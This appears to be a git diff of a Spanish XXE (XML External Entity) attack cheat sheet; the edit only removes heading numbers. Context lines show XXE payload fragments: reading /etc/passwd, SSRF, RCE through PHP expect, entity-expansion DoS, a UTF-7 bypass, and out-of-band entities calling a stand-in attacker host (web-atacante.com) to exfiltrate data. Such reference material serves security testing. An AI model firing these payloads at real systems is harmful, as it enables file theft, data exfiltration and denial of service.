@@ -23,7 +23,7 @@ Ataques XXE (XML External Entity) son vulnerabilidades que surgen en las aplicac
 
 ---
 
-### 1- Peligros en los ataques XXE <a name="PeligrosXXE"></a>
+### Peligros en los ataques XXE <a name="PeligrosXXE"></a>
 - **Exfiltrar informacion critica:**<br>
 Seria posible obtener archivos internos del servidor incluso en servicios de la red local, lo cual es peligroso.<br>
 Ejemplo: 
@@ -45,8 +45,8 @@ Ejemplo:
 
 ---
 
-### 2- XXE payloads <a name="XXEpayloads"></a>
-**2.1- LFI Test** <a name="XXEaLFI"></a><br>
+###  XXE payloads <a name="XXEpayloads"></a>
+**LFI Test** <a name="XXEaLFI"></a><br>
 Ver archivos internos del servidor
 
 ```xml
@@ -54,7 +54,7 @@ Ver archivos internos del servidor
 <foo>&xxe;</foo>
 ```
 
-**2.2- XXE a SSRF** <a name="XXEaSSRF"></a><br>
+**XXE a SSRF** <a name="XXEaSSRF"></a><br>
 Enumerar la red local del servidor
 ```xml
 <?xml version="1.0"?>
@@ -64,7 +64,7 @@ Enumerar la red local del servidor
 <foo>&xxe;</foo>
 ```
 
-**2.3- XXE a RCE** <a name="XXEaRCE"></a><br>
+**XXE a RCE** <a name="XXEaRCE"></a><br>
 Abusando del modulo expect de php para ejecutar comandos
 (Se requiere tener este modulo en el servidor)
 ```xml
@@ -76,7 +76,7 @@ Abusando del modulo expect de php para ejecutar comandos
        <storeId>2</storeId>
     </checkproduct>
 ```
-**2.4- XXE a DOS** <a name="XXEaDOS"></a><br>
+**XXE a DOS** <a name="XXEaDOS"></a><br>
 Causa una denegacion de servicio mediante repetidas llamadas en las funciones de las entity's
 ```xml
 <?xml version="1.0"?>
@@ -97,8 +97,8 @@ Causa una denegacion de servicio mediante repetidas llamadas en las funciones de
 ```
 ---
 
-### 3- XXE blind en peticion <a name="BlindXXE"></a>
-**3.1- Ver si existe una XXE sin que se vea en la peticion**
+### XXE blind en peticion <a name="BlindXXE"></a>
+**Ver si existe una XXE sin que se vea en la peticion**
 
 Una forma de identificar una XML blind en una petición: Si la aplicación incrusta los datos enviados en un documento XML y luego se analiza el documento como pasa en una solicitud SOAP de backend. Podemos probar a inyectar XInclude que es una parte de la especificación XML que permite crear un documento XML a partir de subdocumentos.<br>
 Ejemplo:
@@ -120,7 +120,7 @@ Ejemplo:
     productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
 ```
 
- **3.2- Tambien se podria usar esto en caso de que sea blind**
+ **Tambien se podria usar esto en caso de que sea blind**
  ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>
 
@@ -137,7 +137,7 @@ Ejemplo:
     productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://web-atacante.com"/></foo>&storeId=1
 ```
 
-**3.3- Blind XXE test (Cuando no devuelve valores)**
+**Blind XXE test (Cuando no devuelve valores)**
 
 ```xml
 <?xml version="1.0"?>
@@ -148,8 +148,8 @@ Ejemplo:
 <foo>&blind;</foo>
 ```
 ---
-### 4- XXE bypass <a name="XXEBypass"></a>
-**4.1- XXE UTF-7**
+### XXE bypass <a name="XXEBypass"></a>
+**XXE UTF-7**
 
 ```xml
 <?xml version="1.0" encoding="UTF-7"?>
@@ -158,7 +158,7 @@ Ejemplo:
 +ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
 ```
 
-**4.2- Access Control bypass (cargando datos confidenciales)**
+**Access Control bypass (cargando datos confidenciales)**
 
 ```xml
 <?xml version="1.0"?>
@@ -169,9 +169,9 @@ Ejemplo:
 
 ---
 
-### 5- Ataques XXE Out-Of-Band: <a name="OutOFBand"></a>
+### Ataques XXE Out-Of-Band: <a name="OutOFBand"></a>
 
-**5.1- EJEMPLO 1**
+**EJEMPLO 1**
 - Se inyecta en el valor &xxe; en uno de los valores xml que se envian
 
 ```xml
@@ -179,14 +179,14 @@ Ejemplo:
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://web-atacante.com"> ]>
 ```
 
-**5.2- EJEMPLO 2**
+**EJEMPLO 2**
 - Payload que incluiremos completo en el valor xml que se envia. Hará una peticion a la web del atacante, asi podremos saber si realmente procesa la informacion que le mandamos.
 
 ```xml
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-atacante.com"> %xxe; ]>
 ```
 
-**5.3- EJEMPLO 3**
+**EJEMPLO 3**
 - Este codigo es de http://web-atacante.com/cositas.dtd
 
 ```xml
@@ -202,7 +202,7 @@ Ejemplo:
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-atacante.com/cositas.dtd"> %xxe;]>
 ```
 
-**5.4- EJEMPLO 4**
+**EJEMPLO 4**
 - XXE BLIND basado en mensaje de error
 - Este codigo es de http://web-atacante.com/cositas.dtd
 
@@ -219,7 +219,7 @@ Ejemplo:
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-atacante.com/cositas.dtd"> %xxe;]>
 ```
 
-**5.5- EJEMPLO 5**
+**EJEMPLO 5**
 - Explotando una XXE abusando de los archivos DTD del sistema, en el archivo llama a ISOamso, usaremos esa variable para explotar la XXE creando un xml personalizado que realice la funcion de llamar al archivo de /etc/passwd que es el objetivo. 
 
 ```xml
